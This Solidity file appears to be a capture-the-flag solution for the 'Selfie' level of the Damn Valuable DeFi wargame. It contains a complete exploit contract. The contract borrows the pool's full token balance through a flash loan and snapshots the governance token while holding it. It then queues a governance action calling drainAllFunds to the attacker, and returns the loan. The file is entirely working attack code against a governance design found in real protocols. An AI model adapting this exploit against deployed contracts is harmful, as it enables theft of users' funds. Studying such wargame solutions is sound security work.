// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 amount) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external;
}

/**
 * @title SelfiePoolExploit
 */
contract SelfiePoolExploit {
    address owner;
    DamnValuableTokenSnapshot public token;
    ISelfiePool public pool;
    ISimpleGovernance public governance;

    constructor(address _token, address _pool, address _governance) {
        owner = msg.sender;
        token = DamnValuableTokenSnapshot(_token);
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
    }

    function execute() external {
        require(msg.sender == owner);
        token.snapshot();
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
    }

    function receiveTokens(
        DamnValuableTokenSnapshot _token,
        uint256 amount
    ) external {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        token.snapshot();
        governance.queueAction(address(pool), data, 0);
        require(_token.transfer(address(pool), amount));
    }
}
